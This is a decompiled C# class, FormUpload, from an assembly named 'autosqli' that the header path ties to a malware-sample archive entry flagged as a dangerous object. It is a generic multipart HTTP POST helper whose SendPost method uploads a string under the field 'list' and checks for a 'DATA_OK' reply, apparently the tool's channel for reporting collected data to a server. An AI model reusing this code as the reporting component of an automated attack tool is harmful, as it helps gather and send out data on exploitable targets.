// Decompiled with JetBrains decompiler
// Type: autosqli.FormUpload
// Assembly: autosqli, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B25FC5BE-B688-4A12-B421-7DDADB9F1C02
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-DangerousObject.Multi.Generic-8265ec22a2c66e396aaf2c0b64786cc70dd3259e97ef5199b7bb5eed41ed3660.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace autosqli
{
  public static class FormUpload
  {
    private static readonly Encoding encoding = Encoding.UTF8;

    public static HttpWebResponse MultipartFormDataPost(
      string postUrl,
      string userAgent,
      Dictionary<string, object> postParameters)
    {
      string boundary = string.Format("----------{0:N}", (object) Guid.NewGuid());
      string contentType = "multipart/form-data; boundary=" + boundary;
      byte[] multipartFormData = FormUpload.GetMultipartFormData(postParameters, boundary);
      return FormUpload.PostForm(postUrl, userAgent, contentType, multipartFormData);
    }

    private static HttpWebResponse PostForm(
      string postUrl,
      string userAgent,
      string contentType,
      byte[] formData)
    {
      try
      {
        if (!(WebRequest.Create(postUrl) is HttpWebRequest httpWebRequest))
          throw new NullReferenceException("request is not a http request");
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = contentType;
        httpWebRequest.UserAgent = userAgent;
        httpWebRequest.CookieContainer = new CookieContainer();
        httpWebRequest.ContentLength = (long) formData.Length;
        using (Stream requestStream = httpWebRequest.GetRequestStream())
        {
          requestStream.Write(formData, 0, formData.Length);
          requestStream.Close();
        }
        return httpWebRequest.GetResponse() as HttpWebResponse;
      }
      catch
      {
        return (HttpWebResponse) null;
      }
    }

    private static byte[] GetMultipartFormData(
      Dictionary<string, object> postParameters,
      string boundary)
    {
      Stream stream = (Stream) new MemoryStream();
      bool flag = false;
      foreach (KeyValuePair<string, object> postParameter in postParameters)
      {
        if (flag)
          stream.Write(FormUpload.encoding.GetBytes("\r\n"), 0, FormUpload.encoding.GetByteCount("\r\n"));
        flag = true;
        if (postParameter.Value is FormUpload.FileParameter)
        {
          FormUpload.FileParameter fileParameter = (FormUpload.FileParameter) postParameter.Value;
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n", (object) boundary, (object) postParameter.Key, (object) (fileParameter.FileName ?? postParameter.Key), (object) (fileParameter.ContentType ?? "application/octet-stream"));
          stream.Write(FormUpload.encoding.GetBytes(s), 0, FormUpload.encoding.GetByteCount(s));
          stream.Write(fileParameter.File, 0, fileParameter.File.Length);
        }
        else
        {
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}", (object) boundary, (object) postParameter.Key, postParameter.Value);
          stream.Write(FormUpload.encoding.GetBytes(s), 0, FormUpload.encoding.GetByteCount(s));
        }
      }
      string s1 = "\r\n--" + boundary + "--\r\n";
      stream.Write(FormUpload.encoding.GetBytes(s1), 0, FormUpload.encoding.GetByteCount(s1));
      stream.Position = 0L;
      byte[] buffer = new byte[stream.Length];
      stream.Read(buffer, 0, buffer.Length);
      stream.Close();
      return buffer;
    }

    public static bool SendPost(string postURL, string all, string reqvar = "list")
    {
      try
      {
        Dictionary<string, object> postParameters = new Dictionary<string, object>();
        postParameters.Add(reqvar, (object) all);
        string userAgent = "Someone";
        HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(postURL, userAgent, postParameters);
        if (new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd().Contains("DATA_OK"))
          return true;
        httpWebResponse.Close();
      }
      catch
      {
      }
      return false;
    }

    public class FileParameter
    {
      public byte[] File { get; set; }

      public string FileName { get; set; }

      public string ContentType { get; set; }

      public FileParameter(byte[] file)
        : this(file, (string) null)
      {
      }

      public FileParameter(byte[] file, string filename)
        : this(file, filename, (string) null)
      {
      }

      public FileParameter(byte[] file, string filename, string contenttype)
      {
        this.File = file;
        this.FileName = filename;
        this.ContentType = contenttype;
      }
    }
  }
}
